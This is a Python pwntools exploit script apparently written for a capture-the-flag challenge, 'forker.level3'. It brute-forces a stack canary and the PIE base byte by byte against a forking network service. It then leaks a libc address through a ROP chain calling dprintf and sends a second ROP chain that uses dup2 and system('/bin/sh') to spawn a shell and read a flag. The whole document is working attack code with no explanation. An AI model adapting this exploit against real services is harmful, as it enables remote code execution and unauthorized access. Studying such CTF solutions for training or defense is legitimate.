from pwn import *
import sys

def rem(lvl):
    while True:
        try:
            return remote('forker4.wpictf.xyz', 31338, level=lvl, timeout=1)
        except Exception as e:
            print(e)
            continue


def attempt(data, lvl='error'):
    """
    attempt throwing data. Returns whether the binary crashed
    """
    with rem(lvl) as r:
        r.recvuntil('Password:')
        r.sendline(data)
        try:
            r.recvuntil('d00d', timeout=1)
            return False
        except EOFError: # binary crashed, no line
            return True

def trial(ttt):
    known, value = ttt
    if value == 10:
        return False, -1
    pad = 'A'*0x48
    trial_cookie = ''.join(map(chr, known + [value]))
    if not attempt(pad + trial_cookie):
        return True, value
    return False, -1

def brute_next_cookie_byte(known):
    for success, value in map(trial, [(known, x) for x in range(0x100)]):
        if success:
            return value
    raise ValueError('could not find byte of cookie! D:')

def brute_cookie():
    known = [0, 29, 208, 141, 243, 253, 58, 252]
    while len(known) < 8:
        next_byte = brute_next_cookie_byte(known)
        known.append(next_byte)
        print('Found cookie byte: {}, known = {}'.format(next_byte, known))
    return known

cookie = brute_cookie()
print(cookie)

def pie_trial(ttt):
    known, value = ttt
    if value == 10:
        return False, -1
    pad = 'A'*0x48 + ''.join(map(chr, cookie)) + p64(4)*5
    trial_cookie = ''.join(map(chr, known + [value]))
    if not attempt(pad + trial_cookie, 'debug'):
        return True, value
    return False, -1

def brute_next_pie_byte(known):
    for val in range(0x100):
        success, _ = pie_trial((known, val))
        if success:
            return val
    raise ValueError('could not find byte of PIE! D:')

def brute_pie():
    known = []
    while len(known) < 8:
        next_byte = brute_next_pie_byte(known)
        known.append(next_byte)
        print('Found PIE byte: {}, known = {}'.format(next_byte, known))
    return known

pie = brute_pie()
print(pie)

attempt('A'*0x48 + ''.join(map(chr, cookie)) + p64(4)*5, 'debug')

# Let's guess the GOT is the same layout
e = ELF('./f3/forker.level3')
e.address = u64(''.join(map(chr, pie))) & ~0xfff
print(hex(e.address))

libc = ELF('libc-2.26.so')

for gadget_offset in range(0xb00, 0xfff):
    print(hex(gadget_offset))
    pop_rsi_r15 = e.address + gadget_offset
    pop_rdi = e.address + gadget_offset + 2

    fd = 4

    rop = ''.join(map(p64, [
        # Leak puts
        pop_rdi,
        fd,
        pop_rsi_r15,
        e.got['puts'],
        0xdeadbeef,
        e.symbols['dprintf'],
    ]))

    with rem('debug') as r:
        r.recvuntil('Password:')
        r.sendline('A'*0x48 + ''.join(map(chr, cookie)) + 'B'*0x28 + rop)

        try:
            puts = u64(r.recvn(6, timeout=2) + '\x00'*2)
            print(r.recvall().encode('hex'))
        except Exception as ex:
            print(ex)
            continue
        libc.address = puts - libc.symbols['puts']
        if libc.address >> (5*8) < 0x70:
            continue

        print(hex(gadget_offset))
        print(hex(libc.address))

    rop2 = ''.join(map(p64, [
        pop_rdi,
        fd,
        pop_rsi_r15,
        0,
        0xdeadbeef,
        libc.symbols['dup2'],

        pop_rdi,
        fd,
        pop_rsi_r15,
        1,
        0xdeadbeef,
        libc.symbols['dup2'],

        pop_rdi,
        next(libc.search('/bin/sh\x00')),
        libc.symbols['system'],
    ]))

    with rem('debug') as r:
        r.recvuntil(':')
        r.sendline('A'*0x48 + ''.join(map(chr, cookie)) + 'B'*0x28 + rop2)

        sleep(1)
        r.sendline('cat flag.txt; exit')
        r.recvall()
